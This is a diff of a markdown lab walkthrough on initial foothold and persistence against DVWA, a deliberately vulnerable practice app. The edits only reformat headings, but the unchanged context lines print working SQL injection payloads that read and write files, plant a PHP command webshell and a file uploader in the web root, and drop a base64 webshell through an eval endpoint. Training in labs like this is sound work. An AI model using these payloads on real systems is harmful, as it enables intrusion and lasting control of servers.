@@ -1,6 +1,6 @@
 # 04 - Initial Foothold and Persistence
 
-Search Tag: #sql-injection #union #initial-foothold #persistence #enumeration-and-discovery #webshell #dvwa
+Search Tag(s): #sql-injection #union #initial-foothold #persistence #enumeration-and-discovery #webshell #dvwa
 
 ## 4.1 - Create User Account
 
@@ -110,7 +110,7 @@ Note: This step is necessary to find a destination to write a webshell.
 ' UNION SELECT 1, LOAD_FILE('/dev/shm/file.txt')#
 ```
 
-**Hex encoded**
+- Hex encoded
 
 ```sql
 ' UNION SELECT 0x74657374, NULL INTO OUTFILE '/dev/shm/file.txt'#
@@ -134,7 +134,7 @@ Note: This step is necessary to find a destination to write a webshell.
 ' UNION SELECT NULL, LOAD_FILE('C:\\Windows\\Temp\\file.txt')#
 ```
 
-**Hex encoded**
+- Hex encoded
 
 ```sql
 ' UNION SELECT 0x74657374, NULL INTO OUTFILE 'C:\\Windows\\Temp\\file.txt'#
@@ -200,7 +200,7 @@ Here's the error message.
 Can't create/write to file '/var/www/shell.php' (Errcode: 13 "Permission denied")
 ```
 
-- **Save the webshell with an absolute path**
+- Save the webshell with an absolute path
 
 ```sql
 ' UNION SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>', NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
@@ -304,7 +304,7 @@ Convert it to SQLi injection exploit with **UNION SELECT**.
 ' UNION SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>', NULL INTO OUTFILE '/var/www/html/dvwa/uploader.php'#
 ```
 
-- **Base64 encoded**
+- Base64 encoded
 
 ```sql
 ' UNION SELECT FROM_BASE64("<base64_encoded>"), NULL INTO OUTFILE '/var/www/html/dvwa/file.php'#
@@ -363,7 +363,7 @@ http://dvwa.local/dvwa/eval_php.php?evaluate=phpinfo()
 
 `<insert screenshots>`
 
-- **Base64 encoded**
+- Base64 encoded
 
 ```
 http://dvwa.local/dvwa/eval_php.php?evaluate=if(file_put_contents('webshell.php', base64_decode(<base64_encoded>))){ echo 1;} else {echo 2;}
